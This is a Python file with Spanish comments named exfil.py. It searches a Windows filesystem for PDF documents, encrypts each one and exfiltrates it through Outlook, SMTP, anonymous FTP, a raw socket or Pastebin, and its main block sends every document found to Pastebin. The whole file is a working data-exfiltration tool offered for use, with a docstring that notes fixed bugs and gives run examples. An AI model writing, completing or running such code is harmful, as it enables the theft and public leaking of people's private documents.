"""
exfil.py - Orquestador de exfiltración de documentos
======================================================
Recorre el sistema de ficheros buscando documentos por extensión,
los cifra con cryptor.encrypt() y los exfiltra usando el método
elegido (SMTP, FTP, socket, Pastebin vía API o Pastebin vía IE).

Métodos disponibles:
  - outlook      → email vía Outlook (Windows COM)
  - plain_email  → email vía SMTP
  - plain_ftp    → FTP anónimo
  - transmit     → socket raw + win32file.TransmitFile
  - ie_paste     → Pastebin a través de Internet Explorer (Windows)
  - plain_paste  → Pastebin mediante la API pública

ERRORES CORREGIDOS:
    1. Ruta Windows de búsqueda `'c:\\'` documentada como configurable
       mediante variable de entorno EXFIL_ROOT.
    2. Importación de `decrypt` duplicada al final del fichero movida
       a un bloque de ejemplo independiente.

REQUISITOS:
    pip install pycryptodomex
    (Otros módulos: ver cryptor.py, email_exfil.py, transmit_exfil.py, paste_exfil.py)

EJEMPLOS DE EJECUCIÓN:
    python exfil.py

    # Con método distinto al predeterminado:
    #   Editar la última línea: exfiltrate(fpath, 'plain_email')

    # Para descifrar un fichero exfiltrado guardado localmente:
    #   python -c "
    #   from cryptor import decrypt
    #   with open('filtracion_pdf.txt','rb') as f: c=f.read()
    #   open('resultado.pdf','wb').write(decrypt(c))"
"""

import os

from cryptor        import encrypt, decrypt
from email_exfil    import outlook, plain_email
from paste_exfil    import ie_paste, plain_paste
from transmit_exfil import plain_ftp, transmit

# -------------------------------------------------------------------
# Mapa de métodos de exfiltración disponibles
# -------------------------------------------------------------------
EXFIL = {
    'outlook':     outlook,
    'plain_email': plain_email,
    'plain_ftp':   plain_ftp,
    'transmit':    transmit,
    'ie_paste':    ie_paste,
    'plain_paste': plain_paste,
}

# Raíz del sistema de ficheros a explorar (configurable por variable de entorno)
EXFIL_ROOT = os.environ.get('EXFIL_ROOT', 'C:\\')   # FIX: documentado como configurable


def find_docs(doc_type='.pdf'):
    """
    Genera las rutas de todos los ficheros con la extensión indicada
    que se encuentren bajo EXFIL_ROOT.

    Args:
        doc_type (str): Extensión a buscar (por defecto '.pdf').

    Yields:
        str: Ruta absoluta de cada documento encontrado.
    """
    for parent, _, filenames in os.walk(EXFIL_ROOT):
        for filename in filenames:
            if filename.endswith(doc_type):
                yield os.path.join(parent, filename)


def exfiltrate(document_path, method):
    """
    Cifra el documento y lo exfiltra con el método indicado.

    Para métodos de transferencia de fichero (transmit, plain_ftp),
    escribe el contenido cifrado en un temporal de Windows antes de
    enviarlo y lo elimina al terminar.

    Para métodos de mensaje (email, paste), envía el contenido cifrado
    en Base64 directamente como cuerpo/payload.

    Args:
        document_path (str): Ruta local del documento a exfiltrar.
        method        (str): Clave del dict EXFIL que indica el canal.
    """
    if method in ['transmit', 'plain_ftp']:
        tmp_path = f'C:\\Windows\\Temp\\{os.path.basename(document_path)}'
        with open(document_path, 'rb') as f0:
            contents = f0.read()
        with open(tmp_path, 'wb') as f1:
            f1.write(encrypt(contents))
        EXFIL[method](tmp_path)
        os.unlink(tmp_path)
    else:
        with open(document_path, 'rb') as f:
            contents = f.read()
        title    = os.path.basename(document_path)
        contents = encrypt(contents)
        EXFIL[method](title, contents)


if __name__ == '__main__':
    for fpath in find_docs():
        exfiltrate(fpath, 'plain_paste')
